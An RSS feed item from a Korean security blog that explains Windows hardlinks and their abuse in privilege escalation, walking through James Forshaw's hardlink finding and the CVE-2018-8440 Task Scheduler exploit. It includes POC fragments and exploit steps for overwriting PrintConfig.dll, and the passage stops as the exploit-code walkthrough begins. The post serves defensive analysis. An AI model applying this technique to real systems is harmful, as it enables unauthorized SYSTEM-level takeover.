<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
	<channel>
		<title>Diffense</title>
		<description>{&quot;meta&quot;=&gt;nil, &quot;subtitle&quot;=&gt;nil}</description>
		<link>http://localhost:4000</link>
		<atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
		
			<item>
				<title>Hello HardLink? Bye HardLink!</title>
				
					<dc:creator>{&quot;name&quot;=&gt;&quot;Yongil Lee of Diffense&quot;}</dc:creator>
				
				
					<description>&lt;p&gt;하드링크란 무엇이며, 익스플로잇에서 활용되는 하드링크와 일반적인 하드링크와의 차이점이 무엇인지 알아보겠습니다.&lt;/p&gt;

&lt;p&gt;또한, 실제 권한상승 익스플로잇(CVE-2018–8440) 사례를 통해 하드링크가 어떤 식으로 활용되고 있는지 알아봅니다.&lt;/p&gt;

&lt;p&gt;마지막으로 하드링크를 활용한 권한상승 익스플로잇을 효과적으로 탐지할 수 있는 방안에 대해 소개하겠습니다.&lt;/p&gt;

&lt;h3 id=&quot;하드링크&quot;&gt;하드링크?&lt;/h3&gt;
&lt;p&gt;(하드링크에 대해 알고 계신 분은 건너뛰세요!)&lt;/p&gt;

&lt;p&gt;윈도우즈 하드링크는 동일한 파일을 참조하는 여러 개의 파일명을 만들 수 있는 기능입니다.&lt;/p&gt;

&lt;p&gt;그림 하나면 쉽게 이해할 수 있습니다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://upload.wikimedia.org/wikipedia/commons/thumb/3/32/Hard_Link_Illustration.svg/314px-Hard_Link_Illustration.svg.png&quot; alt=&quot;hardlink&quot; /&gt; 출처: Wikipedia&lt;/p&gt;

&lt;p&gt;위 그림을 보면 실제 파일이 NTFS 파일시스템 볼륨(C드라이브)내 어딘가에 존재하고 있고, 우리는 이 파일을 A.TXT라는 파일명으로 링크하여 참조하고 있음을 볼 수 있습니다. 하드링크를 이용하면 해당 파일을 참조하는 또 다른 파일명(B.TXT)을 만들 수 있습니다.&lt;/p&gt;

&lt;p&gt;만약 하드링크를 통해 파일 내용을 수정하거나 삭제 혹은 권한을 변경하면 어떻게 될까요?&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;하드링크 수정
    &lt;ul&gt;
      &lt;li&gt;A.TXT, B.TXT는 &lt;em&gt;모두 같은 파일에 대한 링크&lt;/em&gt;라서 둘 중 어떤 링크를 수정하더라도 동일한 결과가 나옵니다.&lt;/li&gt;
      &lt;li&gt;A.TXT를 수정한 다음 B.TXT 내용을 보면 서로 내용이 동일한 것을 알 수 있습니다. 물론 역도 마찬가지입니다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;하드링크 삭제
    &lt;ul&gt;
      &lt;li&gt;파일은 &lt;em&gt;링크 참조 카운트&lt;/em&gt;를 내부적으로 유지하고 있습니다. 예제의 경우 링크 참조 카운트는 2가 될 것입니다.&lt;/li&gt;
      &lt;li&gt;하나의 링크를 삭제하면 그것이 가리키는 파일의 링크 참조카운트가 1씩 감소합니다. 참조카운트가 0이 되면 최종적으로 파일이 삭제됩니다.&lt;/li&gt;
      &lt;li&gt;하나의 링크(A.TXT)를 삭제하더라도 다른 링크(B.TXT)가 살아있다면 해당 파일을 계속 참조할 수 있는 것이죠.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;파일의 권한을 변경하려는 경우
    &lt;ul&gt;
      &lt;li&gt;기존 링크(A.TXT)나 새로 생성된 하드링크(B.TXT) 둘 중 어떤 링크를 통해 권한을 바꾸어도 둘의 결과는 동일합니다. 링크가 가리키는 파일의 권한이 변경되는 것이죠.&lt;/li&gt;
      &lt;li&gt;탐색기를 열어 A.TXT 파일의 권한을 수정한 후 B.TXT 권한을 확인해보세요. 동일함을 확인할 수 있을 겁니다. 역도 마찬가지입니다.&lt;/li&gt;
      &lt;li&gt;링크 자체의 권한은 어떻게 바꾸는지 궁금한 분들이 있을 것입니다. 하드링크 자체는 &lt;em&gt;파일로서 존재하는 것이 아니라 디렉토리의 엔트리로 표현되는 것이라 권한이라는 것이 없습니다&lt;/em&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;하드링크 생성에는 다음과 같은 제약이 있습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;디렉토리간에는 하드링크를 만들 수 없습니다. (C:\A linked to C:\B)&lt;/li&gt;
  &lt;li&gt;다른 볼륨간에 하드링크를 만들 수 없습니다. (C:\A.TXT linked to D:\B.TXT)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이제 하드링크를 생성하는 방법을 알아보겠습니다.&lt;/p&gt;

&lt;h3 id=&quot;하드링크-생성-방법&quot;&gt;하드링크 생성 방법&lt;/h3&gt;

&lt;p&gt;커맨드라인에서 &lt;strong&gt;mklink&lt;/strong&gt; 명령어를 이용하면 하드링크를 만들 수 있습니다.&lt;/p&gt;

&lt;p&gt;다음은 기존파일(hello.txt)에 하드링크(bye.txt)를 생성하는 예제입니다.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bat&quot;&gt;C:\temp&amp;gt;echo hello &amp;gt; hello.txt              ; hello.txt 만듭니다.

C:\temp&amp;gt;type hello.txt                      ; hello.txt 내용을 확인합니다.
hello

C:\temp&amp;gt;mklink /H bye.txt hello.txt         ; 하드링크(bye.txt -&amp;gt; hello.txt) 만듭니다.
하드 링크 작성: bye.txt &amp;lt;&amp;lt;===&amp;gt;&amp;gt; hello.txt

C:\temp&amp;gt;type bye.txt                        ; 하드링크 내용을 확인합니다. 
hello

C:\temp&amp;gt;echo bye &amp;gt; bye.txt                  ; 하드링크의 내용을 변경합니다.

C:\temp&amp;gt;type hello.txt                      ; 기존파일(hello.txt)의 내용이 변경된 것을 확인할 수 있습니다.
bye
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;mklink 명령어는 &lt;code class=&quot;highlighter-rouge&quot;&gt;CreateHardLink&lt;/code&gt; API를 사용하여 하드링크를 생성합니다.&lt;/p&gt;

&lt;h3 id=&quot;createhardlink&quot;&gt;CreateHardLink&lt;/h3&gt;

&lt;p&gt;윈도우즈에서 하드링크를 만드는데 사용되는 API가 &lt;code class=&quot;highlighter-rouge&quot;&gt;CreateHardLink&lt;/code&gt;&lt;sup id=&quot;fnref:1&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;입니다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CreateHardLink&lt;/code&gt; 사용법은 다음과 같습니다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateHardLinkA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;LPCSTR&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;lpFileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;LPCSTR&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;lpExistingFileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;LPSECURITY_ATTRIBUTES&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpSecurityAttributes&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;첫번째 인자에 생성될 파일명(하드링크)을 넣어주고, 두번째 인자에 기존(대상) 파일명을 입력해주면 하드링크를 생성할 수 있습니다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CreateHardLink&lt;/code&gt;가 실패를 리턴하는 경우는 다음과 같습니다.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;다른 볼륨에 있는 파일에 하드링크를 거는 경우 (앞서 언급)&lt;/li&gt;
  &lt;li&gt;디렉토리간에 하드링크를 거는 경우 (앞서 언급)&lt;/li&gt;
  &lt;li&gt;1023개 이상 하드링크를 만들 경우&lt;/li&gt;
  &lt;li&gt;MAX_PATH 길이보다 긴 패스이름이 사용될 경우&lt;/li&gt;
  &lt;li&gt;또 있을까요?&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;하드링크의-재미난-사실&quot;&gt;하드링크의 재미난 사실&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CreateHardLink&lt;/code&gt; API가 실패하는 원인은 방금 언급한 4가지 경우 외에도 한가지 더 있습니다. 이러한 사실은 윈도우즈 보안 연구로 아주 유명한 
James Forshaw(구글 프로젝트 제로 소속)의 발표&lt;sup id=&quot;fnref:2&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;로 알려지게 되었습니다. 해당 발표 내용에 대한 설명을 조금 해보겠습니다.&lt;/p&gt;

&lt;p&gt;먼저 &lt;code class=&quot;highlighter-rouge&quot;&gt;CreateHardLink&lt;/code&gt;의 구현 내부를 살펴보겠습니다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CreateHardLinkW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPCWSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpFileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LPCWSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpExistingFileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 생략
&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 대상 파일을 Open한다.(FILE_WRITE_ATTRIBUTES 권한을 요구)
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NtOpenFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExistingFileHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SYNCHRONIZE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILE_WRITE_ATTRIBUTES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectAttributes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// Open이 실패하면 하드링크 생성 실패를 리턴
&lt;/span&gt; 
    &lt;span class=&quot;c1&quot;&gt;// 생략
&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 하드링크 생성요청
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NtSetInformationFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExistingFileHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LinkInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FileLinkInformation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;      
    
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위 코드를 보면, 하드링크를 생성하기 위해 &lt;code class=&quot;highlighter-rouge&quot;&gt;NtOpenFile&lt;/code&gt;과 &lt;code class=&quot;highlighter-rouge&quot;&gt;NtSetInformationFile&lt;/code&gt;을 사용하고 있음을 알 수 있습니다. &lt;code class=&quot;highlighter-rouge&quot;&gt;NtOpenFile&lt;/code&gt;로 대상 파일을 오픈하고나서, &lt;code class=&quot;highlighter-rouge&quot;&gt;NtSetInformationFile&lt;/code&gt;을 호출하는 2단계로 이루어져 있는 것이죠.&lt;/p&gt;

&lt;p&gt;여기서 눈여겨 볼 점은 &lt;code class=&quot;highlighter-rouge&quot;&gt;NtOpenFile&lt;/code&gt; 호출이 실패할 경우 &lt;code class=&quot;highlighter-rouge&quot;&gt;CreateHardLink&lt;/code&gt;가 실패를 리턴한다는 것입니다. &lt;code class=&quot;highlighter-rouge&quot;&gt;CreateHardLink&lt;/code&gt;가 실패할 수 있는 경우 한가지가 여기에 있었군요. &lt;code class=&quot;highlighter-rouge&quot;&gt;NtOpenFile&lt;/code&gt;은 어떤 경우에 실패하게 될까요? &lt;code class=&quot;highlighter-rouge&quot;&gt;NtOpenFile&lt;/code&gt;에 사용된 인자(&lt;code class=&quot;highlighter-rouge&quot;&gt;FILE_WRITE_ATTRIBUTES&lt;/code&gt;) 에 주목해주세요. 만약 대상 파일에 대해 &lt;code class=&quot;highlighter-rouge&quot;&gt;FILE_WRITE_ATTRIBUTES&lt;/code&gt; 열기 권한이 없으면, &lt;code class=&quot;highlighter-rouge&quot;&gt;NtOpenFile&lt;/code&gt; 호출은 실패하게 되고 결국 &lt;code class=&quot;highlighter-rouge&quot;&gt;CreateHardLink&lt;/code&gt; 호출은 실패하게 됩니다.&lt;/p&gt;

&lt;p&gt;아래 예는 kernel32.dll에 하드링크를 만들기 위해 mklink를 사용하려는데, 방금 언급한 NtOpenFile의 호출이 실패하여 결국 하드링크 생성에 실패하는 것을 보여주고 있습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Test&amp;gt;mklink /H hardlink.txt c:\windows\system32\kernel32.dll
Access is denied.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;James Forshaw는 이 지점에서 FILE_WRITE_ATTRIBUTES 없이 대상 파일을 Open(&lt;code class=&quot;highlighter-rouge&quot;&gt;NtOpenFile&lt;/code&gt;)하면 어떻게 될까? 라는 의문을 가지고 실험을 해본 결과, 다음과 같은 사실을 발견하게 됩니다.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;대상 파일에 대한 Write 권한이 없어도 하드링크를 만들 수 있다&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CreateHardLink&lt;/code&gt;를 이용하면 파일열기에 실패하여 하드링크를 만들 수 없는 경우(kernel32.dll처럼)가 있었는데, James Forshaw가 발견한 사실을 이용하면 그 경우에도 하드링크를 만들 수 있게 된 것이죠. 이를 증명하기 위해 다음과 같은 POC&lt;sup id=&quot;fnref:3&quot;&gt;&lt;a href=&quot;#fn:3&quot; class=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;를 작성하여 공개하였습니다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// 주요부분만 추려냈습니다.
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CreateNativeHardlink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPCWSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;linkname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LPCWSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ...
&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 대상 파일을 오픈합니다.(DesiredAccess=MAXIMUM_ALLOWED)
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;NtOpenFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExistingFileHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAXIMUM_ALLOWED&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/*이것이 바뀌었습니다*/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,,,,);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// ...
&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 하드링크 생성을 요청합니다.
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;NtSetInformationFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExistingFileHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;link_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;link_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FileLinkInformation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CreateHardLink&lt;/code&gt;는 대상 파일을 오픈할 때 요청한 권한이 &lt;code class=&quot;highlighter-rouge&quot;&gt;FILE_WRITE_ATTRIBUTES&lt;/code&gt;인 반면, James Forshaw가 작성한 함수 &lt;code class=&quot;highlighter-rouge&quot;&gt;CreateNativeHardlink&lt;/code&gt;는 &lt;code class=&quot;highlighter-rouge&quot;&gt;MAXIMUM_ALLOWED&lt;/code&gt;를 사용한다는 것이 가장 큰 차이점입니다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;MAXIMUM_ALLOWED&lt;/code&gt;는 어떻게든 파일을 열어달라는 의미로 보면 됩니다. 즉 &lt;em&gt;어떻게든 대상 파일을 열기만 하면 하드링크 생성이 가능하다&lt;/em&gt;는 점을 코드를 통해 얘기해주고 있는 것이죠.&lt;/p&gt;

&lt;p&gt;James Forshaw가 작성한 CreateHardLink.exe 툴을 이용하여 지금까지 설명한 내용을 테스트해 볼 수 있습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CreateHardLink.exe hardlink.exe c:\windows\system32\kernel32.dll
dir hardlink.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;일반적인 방법(&lt;code class=&quot;highlighter-rouge&quot;&gt;mklink&lt;/code&gt; 혹은 &lt;code class=&quot;highlighter-rouge&quot;&gt;CreateHardLink&lt;/code&gt;)를 이용하면 생성할 수 없었던 하드링크를, James Forshaw가 사실을 이용하면 그러한 경우에도 하드링크를 만들 수 있음을 확인할 수 있습니다.&lt;/p&gt;

&lt;h3 id=&quot;하드링크-오용hardlink-abusing&quot;&gt;하드링크 오용(Hardlink Abusing)&lt;/h3&gt;

&lt;p&gt;James Forshaw가 발견한 하드링크 문제는 단순 흥미거리로 그치지 않고, 최근까지도 권한상승 익스플로잇에 활용되고 있습니다.&lt;/p&gt;

&lt;p&gt;하드링크가 어떤 문제가 될 수 있을까요?&lt;/p&gt;

&lt;p&gt;쓰기 권한이 없는 대상 파일(예:kernel32.dll)에 하드링크를 걸었다고 생각해봅시다. 하드링크를 통해서 대상 파일을 쓸 수 있을까요? 그렇게 된다면 권한상승 취약점으로 이어질 수 있겠지만 윈도우즈가 그렇게 쉬운 상대는 아닙니다. 윈도우즈는 하드링크가 가리키는 파일에 대한 접근 검사(Access Check)를 통해서 쓰기 시도를 막습니다. 쓰기 권한이 없는 대상 파일에 하드링크를 걸 수는 있으나, 하드링크를 통해서 대상 파일을  쓸 수는 없는 것이죠.&lt;/p&gt;

&lt;p&gt;다른 케이스를 생각해봐야겠네요.&lt;/p&gt;

&lt;p&gt;test 폴더가 있습니다. 일반사용자와 시스템관리자 모두 해당 폴더 밑에 파일을 생성하고 삭제할 수 있는 권한이 주어져 있는 상태입니다. 시스템서비스는 일반사용자도 test\log.txt을 쓸 수 있도록 해당 파일의 퍼미션을 바꾸는 작업을 주기적으로 수행한다고 생각해보죠.&lt;/p&gt;

&lt;p&gt;만약 시스템서비스가 test\log.txt 퍼미션을 바꾸려 하기 전에, 일반사용자가 test\log.txt를 삭제하고 하드링크(test\log.txt -&amp;gt; system32\kernel32.dll)를 생성하면 어떻게 될까요? 시스템서비스는 하드링크를 열어 퍼미션을 바꿀 것이고, 결국 하드링크가 가리키던 kernel32.dll 퍼미션이 일반사용자도 파일쓰기 권한을 가지도록 바뀌게 될 것입니다. 파일쓰기 권한이 없던 일반사용자가 시스템의 중요 파일을 쓸 수 있는 상황이 만들어지는 것이죠.&lt;/p&gt;

&lt;p&gt;이와 비슷한 실제 취약점 사례를 바로 살펴보겠습니다.&lt;/p&gt;

&lt;h3 id=&quot;cve-20188440&quot;&gt;CVE-2018–8440&lt;/h3&gt;

&lt;p&gt;실제 권한 상승 익스플로잇에서는 하드링크를 어떻게 활용하는지 알아보겠습니다.&lt;/p&gt;

&lt;p&gt;살펴볼 취약점은 2018년 말에 발표된 &lt;strong&gt;태스크 스케쥴러 서비스&lt;/strong&gt;의 권한상승(EoP) 취약점입니다. 이 취약점은 많은 주목을 받았는데요. 그 이유는 제작자인 &lt;strong&gt;sandboxescaper&lt;/strong&gt;가 제로데이를 그대로 공개해 버렸기 때문입니다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://www.welivesecurity.com/wp-content/uploads/2018/09/Sandbox-Tweet-Edited.jpg&quot; alt=&quot;sandboxescaper&quot; /&gt; Source: welivesecurity.com&lt;/p&gt;

&lt;p&gt;또한 APT 그룹들이 실제로 오퍼레이션에 활용하였다는 사실&lt;sup id=&quot;fnref:4&quot;&gt;&lt;a href=&quot;#fn:4&quot; class=&quot;footnote&quot;&gt;4&lt;/a&gt;&lt;/sup&gt;이 밝혀지면서 더 이슈가 되었죠.&lt;/p&gt;

&lt;p&gt;태스크 스케쥴러 서비스는 윈도우즈에서 가장 높은 권한인 시스템 권한으로 실행됩니다. 이 서비스는 ALPC 포트라는 일종의 IPC를 통해 외부 프로세스와 통신할 수 있도록 인터페이스를 열어두었습니다.&lt;/p&gt;

&lt;p&gt;열어둔 API 중에서 &lt;strong&gt;SchRpcSetSecurity&lt;/strong&gt;에서 취약점이 발생했는데요. 이 API의 역할은 &lt;em&gt;c:\windows\tasks&lt;/em&gt; 폴더에 있는 파일의 DACL을 조작하는 것입니다. 예를 들어 &lt;em&gt;“일반사용자가 c:\windows\tasks\hello.txt 파일을 READ/WRITE하도록 DACL을 변경해주세요”&lt;/em&gt;와 같은 메시지를 서비스에 요청할 수 있습니다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/yong1212/blog.diffense.co.kr/raw/master/img/sandboxescaper_1.png&quot; alt=&quot;Task Scheduler Service&quot; /&gt;&lt;/p&gt;

&lt;p&gt;tasks 폴더에 위치한 파일의 DACL을 변경할 수 있는 문제와 더불어 “일반 사용자도 tasks 폴더에 파일을 생성(쓰기)할 수 있다”는 사실이 합쳐져 권한상승 익스플로잇이 탄생할 수 있었습니다. 이 과정에서 하드링크가 활용되는데요.&lt;/p&gt;

&lt;p&gt;익스플로잇 과정을 살펴보면서 하드링크의 활용을 이해해보겠습니다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;tasks 폴더에 &lt;strong&gt;하드링크&lt;/strong&gt;(c:\windows\tasks\UpdateTask.job -&amp;gt; c:\windows\system32\kernel32.dll)을 하나 생성합니다. &lt;em&gt;일반사용자가 tasks 폴더에 파일을 생성할 수 있고, 대상 파일(kernel32.dll)에 하드링크도 걸 수 있으니 1번 작업이 가능해집니다.&lt;/em&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;SchRpcSetSecurity를 호출하여, “일반사용자가 c:\windows\tasks\UpdateTask.job의 파일쓰기권한을 가지도록” DACL 변경을 요청합니다.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;태스크 스케쥴러 서비스는 DACL 변경대상이 하드링크인지 아닌지 여부와 상관없이 DACL을 변경해줍니다. 결국 하드링크 대상인 kernel32.dll의 DACL을 변경해버리는 결과가 발생합니다. 즉 일반사용자가 kernel32.dll에 대한 쓰기 권한을 갖게 되는 결과를 낳게 됩니다.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;위 예에서는 kernel32.dll을 예로 들었지만, 앞서 설명드렸듯이 Open할 수 있는 파일이면 모두 하드링크 대상으로 삼을 수 있습니다.&lt;/p&gt;

&lt;p&gt;sandboxescaper는 PrintConfig.dll을 하드링크 대상으로 삼았습니다. 해당 Dll은 스풀러(Spooler)서비스가 사용하는 모듈입니다. sandboxescaper는 취약점을 이용해 PrintConfig.dll를 쓰기 가능하도록 만든 후 그것을 자신의 페이로드로 교체합니다. 그런다음 스풀러(Spooler) 서비스를 호출하여 PrintConfig.dll(페이로드)을 물고 올라가도록 합니다. 최종적으로 자신의 페이로드가 스풀러 프로세스 컨텍스트(시스템권한)에서 실행되도록 하는 것이죠.&lt;/p&gt;

&lt;p&gt;그가 공개한 익스플로잇 코드&lt;sup id=&quot;fnref:5&quot;&gt;&lt;a href=&quot;#fn:5&quot; class=&quot;footnote&quot;&gt;5&lt;/a&gt;&lt;/sup&gt;를 살펴보겠습니다.&lt;/p&gt;

&lt;p&gt;(1) 하드링크 대상(PrintConfig.dll)의 정확한 경로를 구합니다.&lt;/p&gt;
